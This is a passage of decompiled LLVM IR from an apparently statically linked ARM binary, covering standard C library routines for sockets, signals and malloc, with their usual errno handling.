  uselistorder label %dec_label_pc_1233c, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1234c = load i32, i32* @r7, align 4
  store i32 %v3_1234c, i32* %stack_var_-8, align 4
  %v0_12358 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12358, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12358, -4095
  br i1 %tmp, label %dec_label_pc_12378, label %dec_label_pc_12368

dec_label_pc_12368:                               ; preds = %entry
  %v0_12368 = call i32 @__GI___errno_location()
  %v0_1236c = load i32, i32* %r7.global-to-local, align 4
  %v1_1236c = sub i32 0, %v0_1236c
  %v2_12370 = inttoptr i32 %v0_12368 to i32*
  store i32 %v1_1236c, i32* %v2_12370, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12378.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12378

dec_label_pc_12378:                               ; preds = %entry, %dec_label_pc_12368
  %v1_1237c = phi i32 [ %v0_12358, %entry ], [ -1, %dec_label_pc_12368 ]
  %v2_12378 = phi i32 [ %v3_1234c, %entry ], [ %v2_12378.pre, %dec_label_pc_12368 ]
  store i32 %v2_12378, i32* @r7, align 4
  ret i32 %v1_1237c

; uselistorder directives
  uselistorder i32 %v0_12358, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12378, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_123b8, label %dec_label_pc_123a8

dec_label_pc_123a8:                               ; preds = %entry
  %v0_123a8 = call i32 @__GI___errno_location()
  %v0_123ac = load i32, i32* %r4.global-to-local, align 4
  %v1_123ac = sub i32 0, %v0_123ac
  %v2_123b0 = inttoptr i32 %v0_123a8 to i32*
  store i32 %v1_123ac, i32* %v2_123b0, align 4
  br label %dec_label_pc_123b8

dec_label_pc_123b8:                               ; preds = %entry, %dec_label_pc_123a8
  %v1_123c0 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_123a8 ]
  ret i32 %v1_123c0

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_123b8, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_123c8 = load i32, i32* @r7, align 4
  store i32 %v3_123c8, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_123f0, label %dec_label_pc_123e0

dec_label_pc_123e0:                               ; preds = %entry
  %v0_123e0 = call i32 @__GI___errno_location()
  %v0_123e4 = load i32, i32* %r7.global-to-local, align 4
  %v1_123e4 = sub i32 0, %v0_123e4
  %v2_123e8 = inttoptr i32 %v0_123e0 to i32*
  store i32 %v1_123e4, i32* %v2_123e8, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_123f4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_123f0

dec_label_pc_123f0:                               ; preds = %entry, %dec_label_pc_123e0
  %v2_123f4 = phi i32 [ %v3_123c8, %entry ], [ %v2_123f4.pre, %dec_label_pc_123e0 ]
  %v0_123f0 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_123e0 ]
  store i32 %v2_123f4, i32* @r7, align 4
  ret i32 %v0_123f0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_123f0, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12400 = load i32, i32* @r7, align 4
  store i32 %v3_12400, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_12428, label %dec_label_pc_12418

dec_label_pc_12418:                               ; preds = %entry
  %v0_12418 = call i32 @__GI___errno_location()
  %v0_1241c = load i32, i32* %r7.global-to-local, align 4
  %v1_1241c = sub i32 0, %v0_1241c
  %v2_12420 = inttoptr i32 %v0_12418 to i32*
  store i32 %v1_1241c, i32* %v2_12420, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_1242c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12428

dec_label_pc_12428:                               ; preds = %entry, %dec_label_pc_12418
  %v2_1242c = phi i32 [ %v3_12400, %entry ], [ %v2_1242c.pre, %dec_label_pc_12418 ]
  %v0_12428 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_12418 ]
  store i32 %v2_1242c, i32* @r7, align 4
  ret i32 %v0_12428

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12428, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_12438 = load i32, i32* @r4, align 4
  store i32 %v3_12438, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_12468, label %dec_label_pc_12458

dec_label_pc_12458:                               ; preds = %entry
  %v0_12458 = call i32 @__GI___errno_location()
  %v0_1245c = load i32, i32* %r4.global-to-local, align 4
  %v1_1245c = sub i32 0, %v0_1245c
  %v2_12460 = inttoptr i32 %v0_12458 to i32*
  store i32 %v1_1245c, i32* %v2_12460, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_1246c.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_12468

dec_label_pc_12468:                               ; preds = %entry, %dec_label_pc_12458
  %v2_1246c = phi i32 [ %v3_12438, %entry ], [ %v2_1246c.pre, %dec_label_pc_12458 ]
  %v0_12468 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_12458 ]
  store i32 %v2_1246c, i32* @r4, align 4
  ret i32 %v0_12468

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12468, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_124ac, label %dec_label_pc_1249c

dec_label_pc_1249c:                               ; preds = %entry
  %v0_1249c = call i32 @__GI___errno_location()
  %v0_124a0 = load i32, i32* %r4.global-to-local, align 4
  %v1_124a0 = sub i32 0, %v0_124a0
  %v2_124a4 = inttoptr i32 %v0_1249c to i32*
  store i32 %v1_124a0, i32* %v2_124a4, align 4
  br label %dec_label_pc_124ac

dec_label_pc_124ac:                               ; preds = %entry, %dec_label_pc_1249c
  %v1_124b4 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_1249c ]
  ret i32 %v1_124b4

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_124ac, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_124bc = load i32, i32* @r7, align 4
  store i32 %v3_124bc, i32* %stack_var_-8, align 4
  %v0_124c8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_124c8, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_124c8, -4095
  br i1 %tmp, label %dec_label_pc_124e8, label %dec_label_pc_124d8

dec_label_pc_124d8:                               ; preds = %entry
  %v0_124d8 = call i32 @__GI___errno_location()
  %v0_124dc = load i32, i32* %r7.global-to-local, align 4
  %v1_124dc = sub i32 0, %v0_124dc
  %v2_124e0 = inttoptr i32 %v0_124d8 to i32*
  store i32 %v1_124dc, i32* %v2_124e0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_124e8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_124e8

dec_label_pc_124e8:                               ; preds = %entry, %dec_label_pc_124d8
  %v1_124ec = phi i32 [ %v0_124c8, %entry ], [ -1, %dec_label_pc_124d8 ]
  %v2_124e8 = phi i32 [ %v3_124bc, %entry ], [ %v2_124e8.pre, %dec_label_pc_124d8 ]
  store i32 %v2_124e8, i32* @r7, align 4
  ret i32 %v1_124ec

; uselistorder directives
  uselistorder i32 %v0_124c8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_124e8, { 1, 0 }
}

define i32 @__GI_raise(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v3_124f4 = load i32, i32* @r4, align 4
  %v0_124fc = call i32 @__GI_getpid()
  %v2_12504 = call i32 @kill(i32 %v0_124fc, i32 %arg1)
  store i32 %v3_124f4, i32* @r4, align 4
  ret i32 %v2_12504

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 0, 2, 1 }
  uselistorder i32 ()* @__GI_getpid, { 0, 3, 2, 1 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r1, align 4
  %tmp4 = icmp slt i32 %arg1, 1
  br i1 %tmp4, label %dec_label_pc_12528, label %dec_label_pc_12520

dec_label_pc_12520:                               ; preds = %entry
  %v7_12524 = icmp slt i32 %arg1, 65
  br i1 %v7_12524, label %dec_label_pc_1253c, label %dec_label_pc_12528

dec_label_pc_12528:                               ; preds = %dec_label_pc_12520, %entry
  %v0_12528 = call i32 @__GI___errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_12534 = inttoptr i32 %v0_12528 to i32*
  store i32 22, i32* %v2_12534, align 4
  %v0_12544.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12544

dec_label_pc_1253c:                               ; preds = %dec_label_pc_12520
  %v0_1253c = call i32 @__sigaddset()
  store i32 %v0_1253c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12544

dec_label_pc_12544:                               ; preds = %dec_label_pc_12528, %dec_label_pc_1253c
  %v0_12544 = phi i32 [ %v0_12544.pre, %dec_label_pc_12528 ], [ %v0_1253c, %dec_label_pc_1253c ]
  ret i32 %v0_12544

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12544, { 1, 0 }
}

define i32 @sigemptyset(i32* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_1255c = add i32 %tmp, 4
  %v3_1255c = inttoptr i32 %v2_1255c to i32*
  store i32 0, i32* %v3_1255c, align 4
  %v1_12560 = load i32, i32* %r3.global-to-local, align 4
  %v2_12560 = inttoptr i32 %v1_12560 to i32*
  store i32 0, i32* %v2_12560, align 4
  ret i32 0
}

define i32 @bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_12568 = load i32, i32* @r4, align 4
  store i32 %v3_12568, i32* %stack_var_-16, align 4
  %v6_12568 = load i32, i32* @r5, align 4
  %v9_12568 = load i32, i32* @r6, align 4
  %v7_12570 = icmp eq i32 %arg2, -1
  br i1 %v7_12570, label %.thread4, label %bb

.thread4:                                         ; preds = %entry
  br label %.thread16

bb:                                               ; preds = %entry
  %v2_12578 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %arg1, i32* @r5, align 4
  %tmp28 = icmp slt i32 %arg1, 1
  br i1 %tmp28, label %.thread16, label %dec_label_pc_12594

.thread16:                                        ; preds = %bb, %.thread4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1259c

dec_label_pc_12594:                               ; preds = %bb
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i16* @global_var_26010.295 to i32), i32* @r6, align 4
  %v7_12598 = icmp slt i32 %arg1, 65
  br i1 %v7_12598, label %dec_label_pc_125b0, label %dec_label_pc_1259c

dec_label_pc_1259c:                               ; preds = %.thread16, %dec_label_pc_12594
  %v0_1259c = call i32 @__GI___errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_125a8 = inttoptr i32 %v0_1259c to i32*
  store i32 22, i32* %v2_125a8, align 4
  %v0_12608.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb33

dec_label_pc_125b0:                               ; preds = %dec_label_pc_12594
  %v2_125b0 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_125b0, i32* @r4, align 4
  store i32 %arg1, i32* @r1, align 4
  %v2_125b8 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_125b8, i32* @r0, align 4
  store i32 %arg2, i32* %stack_var_-36, align 4
  store i32 0, i32* %stack_var_-24, align 4
  %v0_125c8 = call i32 @__sigaddset()
  %v0_125d0 = load i32, i32* @r5, align 4
  %v0_125d4 = load i32, i32* @r6, align 4
  %v2_125d4 = add i32 %v0_125d4, 26444
  %v2_125d8 = call i32 @__GI___sigismember(i32 %v2_125d4, i32 %v0_125d0)
  store i32 %v2_12578, i32* %r2.global-to-local, align 4
  %v0_125f0 = load i32, i32* @r5, align 4
  %v3_125f8 = call i32 @__libc_sigaction(i32 %v0_125f0, i32 %v2_125b0, i32 %v2_12578)
  %v1_125fc = icmp slt i32 %v3_125f8, 0
  br i1 %v1_125fc, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_125b0
  %v5_12600 = load i32, i32* %stack_var_-56, align 4
  store i32 %v5_12600, i32* %r2.global-to-local, align 4
  br label %bb33

bb32:                                             ; preds = %dec_label_pc_125b0
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %dec_label_pc_1259c, %bb32
  %v0_12608 = phi i32 [ %v5_12600, %bb31 ], [ %v0_12608.pre, %dec_label_pc_1259c ], [ -1, %bb32 ]
  %v2_12610 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_12610, i32* @r4, align 4
  store i32 %v6_12568, i32* @r5, align 4
  store i32 %v9_12568, i32* @r6, align 4
  ret i32 %v0_12608

; uselistorder directives
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 ()* @__sigaddset, { 1, 0 }
  uselistorder i32 65, { 1, 2, 3, 4, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 3, 0, 2 }
  uselistorder label %bb33, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1259c, { 1, 0 }
}

define i32 @__GI___sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_12620 = add i32 %arg2, -1
  %v3_12624 = udiv i32 %v1_12620, 32
  %v4_12628 = mul nuw nsw i32 %v3_12624, 4
  %v5_12628 = add i32 %v4_12628, %arg1
  %v6_12628 = inttoptr i32 %v5_12628 to i32*
  %v7_12628 = load i32, i32* %v6_12628, align 4
  %v1_1262c = urem i32 %v1_12620, 32
  %v7_12634 = shl i32 1, %v1_1262c
  %v8_12634 = and i32 %v7_12628, %v7_12634
  %v10_12634 = icmp ne i32 %v8_12634, 0
  %. = zext i1 %v10_12634 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_12620, { 1, 0 }
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %v0_12644 = load i32, i32* @r1, align 4
  %v1_12644 = add i32 %v0_12644, -1
  %v3_12648 = udiv i32 %v1_12644, 32
  %v0_1264c = load i32, i32* @r0, align 4
  %v4_1264c = mul nuw nsw i32 %v3_12648, 4
  %v5_1264c = add i32 %v0_1264c, %v4_1264c
  %v6_1264c = inttoptr i32 %v5_1264c to i32*
  %v7_1264c = load i32, i32* %v6_1264c, align 4
  %v1_12650 = urem i32 %v1_12644, 32
  %v7_12658 = shl i32 1, %v1_12650
  %v8_12658 = or i32 %v7_1264c, %v7_12658
  store i32 %v8_12658, i32* %v6_1264c, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_12644, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_12668 = add i32 %arg2, -1
  %v3_1266c = udiv i32 %v1_12668, 32
  %v4_12670 = mul nuw nsw i32 %v3_1266c, 4
  %v5_12670 = add i32 %v4_12670, %arg1
  %v6_12670 = inttoptr i32 %v5_12670 to i32*
  %v7_12670 = load i32, i32* %v6_12670, align 4
  %v1_12674 = urem i32 %v1_12668, 32
  %tmp = shl i32 -1, %v1_12674
  %v8_1267c = add i32 %tmp, -1
  %v9_1267c = and i32 %v7_12670, %v8_1267c
  store i32 %v9_1267c, i32* %v6_12670, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_12668, { 1, 0 }
}

define i32 @__malloc_largebin_index(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v3_1268c = udiv i32 %arg1, 256
  store i32 %v3_1268c, i32* %r1.global-to-local, align 4
  %v2_12690 = icmp ugt i32 %arg1, 16777215
  store i32 %arg1, i32* %ip.global-to-local, align 4
  br i1 %v2_12690, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  %v0_1269c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_12690, i32 %v0_1269c)
  %v0_126a0 = load i32, i32* %r1.global-to-local, align 4
  %v1_126a0 = add i32 %v0_126a0, 1048320
  %v3_126a4 = udiv i32 %v1_126a0, 65536
  %v1_126a8 = and i32 %v3_126a4, 8
  %v6_126ac = shl i32 %v0_126a0, %v1_126a8
  %v1_126b0 = add i32 %v6_126ac, 520192
  %v3_126b4 = udiv i32 %v1_126b0, 65536
  %v1_126b8 = and i32 %v3_126b4, 4
  %v6_126bc = shl i32 %v6_126ac, %v1_126b8
  %v1_126c0 = add i32 %v6_126bc, 245760
  %v3_126c4 = udiv i32 %v1_126c0, 65536
  %v1_126c8 = and i32 %v3_126c4, 2
  %v6_126cc = shl i32 %v6_126bc, %v1_126c8
  store i32 %v6_126cc, i32* %r1.global-to-local, align 4
  %v1_126d0 = sub nsw i32 13, %v1_126a8
  %v2_126d4 = sub nsw i32 %v1_126d0, %v1_126b8
  %v3_126d8 = udiv i32 %v6_126cc, 32768
  %v4_126d8 = sub nuw nsw i32 -1, %v3_126d8
  %v4_126dc = udiv i32 %v6_126cc, 16384
  %v5_126dc = and i32 %v4_126dc, %v4_126d8
  %v2_126e0 = sub nsw i32 %v2_126d4, %v1_126c8
  %v2_126e4 = add nsw i32 %v2_126e0, %v5_126dc
  %v1_126e8 = add nsw i32 %v2_126e4, 6
  %v0_126ec = load i32, i32* %ip.global-to-local, align 4
  %v6_126ec = lshr i32 %v0_126ec, %v1_126e8
  %v3_126f0 = mul nsw i32 %v2_126e4, 4
  %v1_126f4 = add nsw i32 %v3_126f0, 32
  %v1_126f8 = urem i32 %v6_126ec, 4
  %v2_126fc = or i32 %v1_126f8, %v1_126f4
  ret i32 %v2_126fc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_12704 = load i32, i32* @r4, align 4
  %v6_12704 = load i32, i32* @r5, align 4
  %v9_12704 = load i32, i32* @r6, align 4
  %v12_12704 = load i32, i32* @r7, align 4
  %v15_12704 = load i32, i32* @r8, align 4
  %v18_12704 = load i32, i32* @sb, align 4
  %v21_12704 = load i32, i32* @sl, align 4
  %v24_12704 = load i32, i32* @fp, align 4
  %v27_12704 = load i32, i32* @lr, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i16* @global_var_26010.295 to i32), i32* %r1.global-to-local, align 4
  %v4_12718 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 72) to i32*), align 4
  store i32 %v4_12718, i32* %r4.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  %v4_12724 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 36) to i32*), align 4
  store i32 %v4_12724, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %v4_12718, i32* %r2.global-to-local, align 4
  %v2_12730 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_12730, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  store i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32* %ip.global-to-local, align 4
  %v4_1273c = load i32, i32* inttoptr (i32 add (i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32 76) to i32*), align 4
  store i32 %v4_1273c, i32* %ip.global-to-local, align 4
  store i32 75592, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1273c)
  %v0_12748 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_12748, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32* %r1.global-to-local, align 4
  %v4_12754 = load i32, i32* inttoptr (i32 add (i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32 16) to i32*), align 4
  store i32 %v4_12754, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_12760.438 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_12754)
  %v0_12760 = load i32, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_12760, -32
  br i1 %tmp, label %dec_label_pc_1277c, label %dec_label_pc_12768

dec_label_pc_12768:                               ; preds = %entry
  %v0_12768 = call i32 @__GI___errno_location()
  store i32 %v0_12768, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 12, i32* @r3, align 4
  %v2_12774 = inttoptr i32 %v0_12768 to i32*
  store i32 12, i32* %v2_12774, align 4
  br label %dec_label_pc_12ff8

dec_label_pc_1277c:                               ; preds = %entry
  %v1_1277c = add i32 %v0_12760, 11
  store i32 %v1_1277c, i32* %r0.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32* %r2.global-to-local, align 4
  %v2_12788 = icmp ugt i32 %v1_1277c, 14
  %v7_12788 = icmp eq i32 %v1_1277c, 15
  %v2_1278c = xor i1 %v7_12788, true
  %v3_1278c = and i1 %v2_12788, %v2_1278c
  br i1 %v3_1278c, label %bb, label %bb139

bb:                                               ; preds = %dec_label_pc_1277c
  %v5_1278c = and i32 %v1_1277c, -8
  store i32 %v5_1278c, i32* @sl, align 4
  br label %bb139

bb139:                                            ; preds = %dec_label_pc_1277c, %bb
  %v4_12790 = load i32, i32* inttoptr (i32 add (i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32 32) to i32*), align 4
  store i32 %v4_12790, i32* @r0, align 4
  %v1_12794 = inttoptr i32 %v4_12790 to i32*
  %v2_12794 = load i32, i32* %v1_12794, align 4
  store i32 %v2_12794, i32* @r4, align 4
  %v2_12798 = xor i1 %v2_12788, true
  %v3_12798 = or i1 %v7_12788, %v2_12798
  br i1 %v3_12798, label %bb140, label %bb141

bb140:                                            ; preds = %bb139
  store i32 16, i32* @sl, align 4
  br label %bb141

bb141:                                            ; preds = %bb139, %bb140
  %v1_1279c = urem i32 %v2_12794, 2
  %v2_1279c = icmp eq i32 %v1_1279c, 0
  br i1 %v2_1279c, label %dec_label_pc_127a4, label %dec_label_pc_127b4

dec_label_pc_127a4:                               ; preds = %bb141
  %v2_127a4 = icmp eq i32 %v2_12794, 0
  br i1 %v2_127a4, label %dec_label_pc_127ac, label %dec_label_pc_12b90

dec_label_pc_127ac:                               ; preds = %dec_label_pc_127a4
  %v0_127ac = call i32 @__malloc_consolidate()
  store i32 %v0_127ac, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12b90

dec_label_pc_127b4:                               ; preds = %bb141
  %v0_127b4 = load i32, i32* @sl, align 4
  %tmp202 = icmp ugt i32 %v0_127b4, %v2_12794
  br i1 %tmp202, label %dec_label_pc_127dc, label %dec_label_pc_127bc

dec_label_pc_127bc:                               ; preds = %dec_label_pc_127b4
  %v1_127bc = add i32 %v4_12790, -4
  store i32 %v1_127bc, i32* %r1.global-to-local, align 4
  %v3_127c0 = udiv i32 %v0_127b4, 8
  store i32 %v3_127c0, i32* %r2.global-to-local, align 4
  %v4_127c4 = mul nuw i32 %v3_127c0, 4
  %v5_127c4 = add i32 %v4_127c4, %v1_127bc
  %v6_127c4 = inttoptr i32 %v5_127c4 to i32*
  %v7_127c4 = load i32, i32* %v6_127c4, align 4
  store i32 %v7_127c4, i32* %r0.global-to-local, align 4
  %v2_127c8 = icmp eq i32 %v7_127c4, 0
  br i1 %v2_127c8, label %dec_label_pc_127dc, label %.thread2

.thread2:                                         ; preds = %dec_label_pc_127bc
  %v2_127cc = add i32 %v7_127c4, 8
  %v3_127cc = inttoptr i32 %v2_127cc to i32*
  %v4_127cc = load i32, i32* %v3_127cc, align 4
  store i32 %v4_127cc, i32* %r3.global-to-local, align 4
  store i32 %v2_127cc, i32* %r0.global-to-local, align 4
  store i32 %v2_127cc, i32* %r4.global-to-local, align 4
  store i32 %v4_127cc, i32* %v6_127c4, align 4
  br label %dec_label_pc_12fdc

dec_label_pc_127dc:                               ; preds = %dec_label_pc_127bc, %dec_label_pc_127b4
  %tmp203 = icmp ugt i32 %v0_127b4, 255
  br i1 %tmp203, label %dec_label_pc_1282c, label %dec_label_pc_127e4

dec_label_pc_127e4:                               ; preds = %dec_label_pc_127dc
  store i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32* %ip.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_127ec = load i32, i32* inttoptr (i32 add (i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32 32) to i32*), align 4
  %v3_127f0 = udiv i32 %v0_127b4, 8
  store i32 %v3_127f0, i32* @r7, align 4
  %v4_127f4 = mul nuw i32 %v3_127f0, 8
  %v5_127f4 = add i32 %v4_127ec, %v4_127f4
  store i32 %v5_127f4, i32* %r3.global-to-local, align 4
  %v1_127f8 = add i32 %v5_127f4, 44
  store i32 %v1_127f8, i32* %ip.global-to-local, align 4
  %v1_127fc = add i32 %v5_127f4, 56
  %v2_127fc = inttoptr i32 %v1_127fc to i32*
  %v3_127fc = load i32, i32* %v2_127fc, align 4
  store i32 %v3_127fc, i32* %r0.global-to-local, align 4
  %v9_12800 = icmp eq i32 %v3_127fc, %v1_127f8
  br i1 %v9_12800, label %dec_label_pc_1298c, label %dec_label_pc_12808

dec_label_pc_12808:                               ; preds = %dec_label_pc_127e4
  %v2_12808 = add i32 %v3_127fc, %v0_127b4
  store i32 %v2_12808, i32* %r3.global-to-local, align 4
  %v1_1280c = add i32 %v2_12808, 4
  %v2_1280c = inttoptr i32 %v1_1280c to i32*
  %v3_1280c = load i32, i32* %v2_1280c, align 4
  store i32 %v3_1280c, i32* %r2.global-to-local, align 4
  %v1_12810 = add i32 %v3_127fc, 12
  %v2_12810 = inttoptr i32 %v1_12810 to i32*
  %v3_12810 = load i32, i32* %v2_12810, align 4
  store i32 %v3_12810, i32* %r1.global-to-local, align 4
  %v1_12814 = or i32 %v3_1280c, 1
  store i32 %v1_12814, i32* %r2.global-to-local, align 4
  %v1_12818 = add i32 %v3_127fc, 8
  store i32 %v1_12818, i32* %r4.global-to-local, align 4
  store i32 %v1_12814, i32* %v2_1280c, align 4
